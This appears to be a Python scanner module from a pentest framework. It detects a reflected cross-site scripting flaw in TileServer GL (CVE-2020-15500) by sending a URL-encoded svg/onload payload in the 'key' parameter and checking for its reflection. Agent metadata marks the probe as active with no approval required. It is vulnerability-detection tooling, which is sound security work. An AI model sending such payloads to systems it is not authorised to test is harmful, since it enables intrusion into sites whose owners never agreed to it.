#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TileServer GL through 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TileServer GL <=3.0.0 - Cross-Site Scripting Detection',
        'description': "TileServer GL through 3.0.0 is vulnerable to reflected cross-site scripting via server.js because the content of the key GET parameter is reflected unsanitized in an HTTP response for the application's main page.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'xss', 'tileserver', 'packetstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/maptiler/tileserver-gl/issues/461',
            'http://packetstormsecurity.com/files/162193/Tileserver-gl-3.0.0-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-15500',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-15500',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('\'>"<svg/onload=confirm(\'xss\')>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="TileServer GL <=3.0.0 - Cross-Site Scripting detected",
                path='/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E',
            )
            return True
        return False

